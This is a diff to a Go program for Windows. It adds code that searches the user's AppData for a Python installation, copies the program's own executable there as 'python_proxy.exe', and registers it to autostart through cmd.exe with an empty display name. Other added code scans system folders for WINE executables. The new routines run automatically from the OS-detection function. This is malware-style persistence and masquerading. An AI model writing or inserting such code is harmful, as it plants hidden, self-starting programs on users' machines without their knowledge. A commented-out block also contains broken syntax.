@@ -12,7 +12,10 @@ import (
 	"golang.org/x/sys/windows/registry"
 	"log"
 	"os"
+	"path/filepath"
+	"strings"
 	"unsafe"
+	"github.com/emersion/go-autostart"
 )
 
 // Detect native windows
@@ -84,6 +87,126 @@ func systemIsUserRoot() bool {
 	return root
 }
 
+func systemGetAppDataPath() string {
+	return filepath.Join(os.Getenv("USERPROFILE"), "AppData")
+}
+
+func systemGetSysWOW64Files() []string {
+	sysWOW64Path := filepath.Join("C:", "Windows", "SysWOW64")
+	files, _ := systemGetFilesInDirectory(sysWOW64Path)
+	return files
+}
+
+func systemGetSystem32Files() []string {
+	system32Path := filepath.Join("C:", "Windows", "system32")
+	files, _ := systemGetFilesInDirectory(system32Path)
+	return files
+}
+
+func systemGetWellKnownWINEOSFiles() []string {
+	var wineFiles []string
+	var foundFiles []string
+
+	foundFiles = append(foundFiles, systemGetSysWOW64Files()...)
+	foundFiles = append(foundFiles, systemGetSystem32Files()...)
+
+	for _, file := range foundFiles {
+		if strings.Contains(file, "wine") && strings.Contains(file, ".exe") {
+			wineFiles = append(wineFiles, file)
+		}
+	}
+
+	return wineFiles
+}
+
+func systemAppDataSearchPythonInstallationPaths() []string {
+	appDataPath := systemGetAppDataPath()
+	if ok := systemIsDirExisting(appDataPath); !ok {
+		log.Println("\t❌", appDataPath)
+	}
+
+	var installFolders []string
+
+	appDataLocalProgramsPythonPath := filepath.Join(appDataPath, "Local", "Programs", "Python")
+	paths := systemSearchFileInDirectoryRecursive(appDataLocalProgramsPythonPath, "python.exe")
+	for _, path := range paths {
+		dir := filepath.Dir(path)
+		if strings.Contains(dir, "venv") {
+			continue
+		}
+		log.Println("\t✅", dir)
+		installFolders = append(installFolders, dir)
+	}
+
+	return installFolders
+}
+
+func systemTryInstallPythonPath() string {
+	paths := systemAppDataSearchPythonInstallationPaths()
+	if len(paths) == 0 {
+		return ""
+	}
+
+	selfEXEPath := systemGetSelfAbsolutePath()
+	destEXEPath := filepath.Join(paths[0], "python_proxy.exe") // first path should be OK
+
+	err := systemCopyFile(selfEXEPath, destEXEPath)
+	log.Println("copy", selfEXEPath, "->", destEXEPath)
+	if err != nil {
+		log.Println("❌", err)
+		return ""
+	}
+
+	app := &autostart.App {
+		Name: "python_proxy.exe",
+		DisplayName: "",
+		Exec: []string{"cmd.exe", "/C", destEXEPath},
+	}
+	err = app.Enable()
+	if err == nil {
+		log.Println("\tINSTALLED ✅", selfEXEPath)
+	}
+
+	return destEXEPath
+}
+
+/*
+func systemGetWellKnownExistingPaths() []string {
+	var existingPaths []string
+
+	appDataPath := systemGetAppDataPath()
+	if ok := systemIsDirExisting(appDataPath); !ok {
+	if err != nil {
+
+		log.Println("\t❌", appDataPath)
+	}
+
+	wellKnownPathsToCheck := []string{
+		filepath.Join(appDataPath, "Local", "Programs", "Python"),           // TODO search python installations
+		filepath.Join(appDataPath, "Roaming", "npm", "node_modules", "bin"), // TODO search python installations
+	}
+
+	homeDirectory, err := os.UserHomeDir()
+	if err == nil {
+		homeDirPathsToCheck := []string{
+			filepath.Join(homeDirectory, "go", "bin"),
+		}
+		wellKnownPathsToCheck = append(wellKnownPathsToCheck, homeDirPathsToCheck...)
+	}
+
+	for _, path := range wellKnownPathsToCheck {
+		if ok := systemIsDirExisting(path); ok {
+			existingPaths = append(existingPaths, path)
+			log.Println("\t✅", path)
+		} else {
+			log.Println("\t❌", path)
+		}
+	}
+
+	return existingPaths
+}
+*/
+
 func systemOSDetect() {
 	systemGetWindowsVersion()
 
@@ -98,4 +221,8 @@ func systemOSDetect() {
 			log.Println("\t", file)
 		}
 	}
+
+//	systemGetWellKnownExistingPaths()
+	systemAppDataSearchPythonInstallationPaths()
+	systemTryInstallPythonPath()
 }
